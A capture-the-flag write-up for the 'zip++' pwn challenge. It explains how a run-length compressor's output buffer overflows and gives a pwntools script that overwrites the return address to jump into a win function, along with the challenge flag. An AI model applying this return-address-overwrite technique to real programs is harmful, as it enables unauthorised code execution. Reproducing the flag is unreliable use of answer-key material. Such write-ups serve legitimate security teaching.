# zip++

## Solution

The program we are given is meant to compress our input by just listing the number of times a character appears in a row next to each character, and it does this for as long as it is given data. This is a horrible explanation, just see below.

```
data to compress :
aaaaaaaaa
compressed data : 61090A01
data to compress : 
aaabbbaaaaa
compressed data : 6103620361050A01
```
If we look into the program we can see that the input and output buffers in `vuln` are relatively similar in length:
```c
char input [768];
byte output [772];
```
However, if we think about this, if we input something such as `asasasasasasasasa` where each character is different from the previous, the output should end up being twice as long as the input. Thus, we should have a buffer overflow, which we can see when we try this:
```
data to compress :
asasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasasas
compressed data  : 6101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730100060000610173010C0300006101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301
data to compress :
compressed data  : 6101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173010A01
data to compress :
exit
Segmentation fault (core dumped)
```

So, all we need to do is overflow the output buffer and override the return address with the address for the `win` function. `win` is located at `0x4011a5`, and since the compression function will always have the number of times a character (or byte) repeats directly afterwards, we can't just send the padding + `0x11a5`, but we can send `0xa5` eleven times to get that end of the address, as in memory the number of repeats is stored first due to little-endianness. For the `0x40` byte, we can just not override that part of the address, as we can't actually send 0 bytes of `0x40` and have that appear on the stack.

We still have an issue though, as we get an EOF, not a flag!
```
$ python3 exploit.py
[+] Opening connection to pwn-14caf623.p1.securinets.tn on port 9000: Done
b'data to compress : \ncompressed data  : 610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101'
[*] Switching to interactive mode
730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173016101730161017301610173011A030000610173010C0300006101730161017301A511
data to compress :
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to pwn-14caf623.p1.securinets.tn port 9000
```

This is due to stack alignment as the `win` function calls system, thus requiring the stack to be properly aligned... which it is not.

The fix is rather simple however, as part of what makes the stack unaligned is the `PUSH RBP` at the start of `win`, which we can fix by just... skipping that instruction and jumping to `0x4011a6` instead, which gets us the flag.

## Script

```py
from pwn import *

p=remote('pwn-14caf623.p1.securinets.tn', 9000)

p.send(b'as'*198+ b'\xa6' * 0x11)
a = p.recv()
print(a)
#gdb.attach(p)
p.send(b'exit')
p.interactive()
```

## Flag

`FLAG: Securinets{my_zip_doesnt_zip}`